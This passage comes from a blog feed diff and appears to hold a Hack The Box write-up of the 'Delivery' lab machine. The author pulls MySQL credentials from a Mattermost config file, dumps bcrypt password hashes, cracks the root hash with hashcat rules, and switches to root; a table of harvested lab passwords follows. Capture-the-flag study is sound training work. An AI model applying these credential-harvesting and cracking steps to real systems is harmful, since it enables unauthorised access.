+drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:52 templates
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Inside of the &lt;code&gt;config&lt;/code&gt; directory we have a &lt;code&gt;config.json&lt;/code&gt; file which does contain some more MySQL credentials, albeit not in the usual PHP format:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;maildeliverer@Delivery:/opt/mattermost/config$ grep -A3 mysql config.json
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DriverName&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mysql&amp;#34;&lt;/span&gt;,
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DataSource&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&amp;#34;&lt;/span&gt;,
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DataSourceReplicas&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;,
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DataSourceSearchReplicas&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;,
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Logging into MySQL once more with the credentials shown above, we can get a list of Username/Passwords from its &lt;code&gt;Users&lt;/code&gt; table:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -p -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;select Username,Password from mattermost.Users;&amp;#34;&lt;/span&gt;
+Enter password:
++----------------------------------+--------------------------------------------------------------+
+| Username                         | Password                                                     |
++----------------------------------+--------------------------------------------------------------+
+| syskey                           | $2a$10$qE1UXoCgvfrKIVqee1BGM.2a3qPxffsYVJ3aMg6g6N11QdrWokaCu |
+| surveybot                        |                                                              |
+| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
+| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
+| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
+| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
+| channelexport                    |                                                              |
+| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
++----------------------------------+--------------------------------------------------------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;These are, of course, hashed password values but ones that can potentially be cracked. Most users can be ommited as they seemingly have no associated password, as can the account for syskey as I created that.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;N.B&lt;/strong&gt; - Ask my team mates about me cracking hashes for passwords I&amp;rsquo;ve created&amp;hellip;&lt;/p&gt;
+&lt;p&gt;The main hash that stands out here is the &amp;ldquo;root&amp;rdquo; hash so that&amp;rsquo;ll be the one to focus on for now.&lt;/p&gt;
+&lt;p&gt;All that said, before proceeding with Hashcat, one other consideration here comes from the Mattermost internal server we discovered earlier. As well as login information, there was also this:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root - 2:30 PM - Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of &amp;quot;PleaseSubscribe!&amp;quot;
+
+root - 3:58 PM - PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Historically, ippsec has mentioned (as part of prior videos) Hashcat rules - namely the likes of &lt;code&gt;best64&lt;/code&gt;. These are rule sets that modify wordlists in interesting ways, to form new combinations without much manual work. In Kali these rulesets are already supplied, but in Parrot the rule files may be found here:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/usr/share/doc/hashcat/rules&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;With that and the following in a file that hashcat would target:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ cat delivery.htb
+root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As well as the password variant in a file named &amp;lsquo;password&amp;rsquo;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ cat password
+PleaseSubscribe!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can look to begin our cracking. One thing to note is that this particular hash is in bcrypt format which is notoriously bitchy to crack:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;$ hashcat --example-hashes | grep bcrypt -A1 -B1
+MODE: &lt;span style=&#34;color:#ae81ff&#34;&gt;3200&lt;/span&gt;
+TYPE: bcrypt $2*$, Blowfish &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Unix&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+HASH: $2a$05$MBCzKhG1KhezLh.0LRa0Kuw12nLJtpHy6DIaU.JAnqJUDYspHC.Ou
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Meaning our full command will be this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ hashcat -m &lt;span style=&#34;color:#ae81ff&#34;&gt;3200&lt;/span&gt; delivery.htb password -r /usr/share/hashcat/rules/best64.rule --user
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;N.B&lt;/strong&gt; - Hashcat&amp;rsquo;s &lt;code&gt;--user&lt;/code&gt; flag just ensures that we don&amp;rsquo;t get a token length exception as a result of us having the username in the hash file.&lt;/p&gt;
+&lt;p&gt;After a fairly short time we get a result:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ hashcat -m &lt;span style=&#34;color:#ae81ff&#34;&gt;3200&lt;/span&gt; delivery.htb passwords -r /usr/share/hashcat/rules/best64.rule --user --show
+root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Attempting to SSH directly to root using this password doesn&amp;rsquo;t let us connect, however using &lt;code&gt;su&lt;/code&gt; via the deliverer user does permit that access:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;maildeliverer@Delivery:/opt/mattermost/config$ su -
+Password:
+root@Delivery:~# ls -la
+total &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;
+drwx------  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jan  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; 06:39 .
+drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jan  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; 06:06 ..
+lrwxrwxrwx  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root    &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; 07:04 .bash_history -&amp;gt; /dev/null
+-rw-r--r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;570&lt;/span&gt; Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2010&lt;/span&gt; .bashrc
+drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:33 .cache
+drwx------  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; 13:41 .gnupg
+-rwxr-x---  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 11:26 mail.sh
+-r--------  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;382&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; 07:02 note.txt
+-rw-r-----  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root  &lt;span style=&#34;color:#ae81ff&#34;&gt;148&lt;/span&gt; Aug &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2015&lt;/span&gt; .profile
+-rw-r-----  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;1499&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 10:55 py-smtp.py
+-r--------  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root   &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; 17:15 root.txt
+drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; 14:28 .vim
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And here&amp;rsquo;s the note from the author:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;root@Delivery:~# cat note.txt
+I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ve seen several times.  The inspiration for the box is here:
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Keep on hacking! And please don&amp;#39;&lt;/span&gt;t forget to subscribe to all the security streamers out there.
+
+- ippsec
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;That said, the man is a complete legend and this box was fun to do. The foothold took me an embarassingly long time to get around but where there&amp;rsquo;s as will&amp;ndash; there&amp;rsquo;s a relative&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;credential-store&#34;&gt;Credential Store&lt;/h1&gt;
+&lt;p&gt;Here&amp;rsquo;s a run down of the username and passwords collected during this box:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;User&lt;/th&gt;
+&lt;th&gt;Password&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;maildeliverer&lt;/td&gt;
+&lt;td&gt;Youve_G0t_Mail!&lt;/td&gt;
+&lt;td&gt;via the Mattemost &amp;ldquo;Internal&amp;rdquo; group&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ost_user&lt;/td&gt;
+&lt;td&gt;!H3lpD3sk123!&lt;/td&gt;
+&lt;td&gt;/var/www/osticket/upload/include/ost-config.php&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;mmuser&lt;/td&gt;
+&lt;td&gt;Crack_The_MM_Admin_PW&lt;/td&gt;
+&lt;td&gt;/opt/mattermost/config/config.json&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;root&lt;/td&gt;
+&lt;td&gt;PleaseSubscribe!21&lt;/td&gt;
+&lt;td&gt;Hashcat via Mattermost DB User Hashes&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;final-thoughts&#34;&gt;Final Thoughts&lt;/h1&gt;
+&lt;p&gt;All in all I found this to be a well crafted, very unique box that demonstrates a vulnerability that could easily be found out in the wild. It also highlights a method I&amp;rsquo;ve never seen before; using generated helpdesk email addresses to intercept correspondence from other, associated, Single Sign On services. Utter genius.&lt;/p&gt;
+&lt;p&gt;Finally, it would be remiss of me not to point this out: my HTB squad TargetRoot, namely my friend Coaran, got the root blood on this box some minutes after the user blood was taken. Please go and drop him, the team and (if you&amp;rsquo;re feeling extra nice) myself a respect hit and spread the love across this incredible community. One that, to this day, I&amp;rsquo;m proud to be part of.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-5ysk3y&lt;/code&gt;&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>Ready [Medium] - Linux</title>
       <link>https://5ysk3y.github.io/htb/guides/ready/</link>
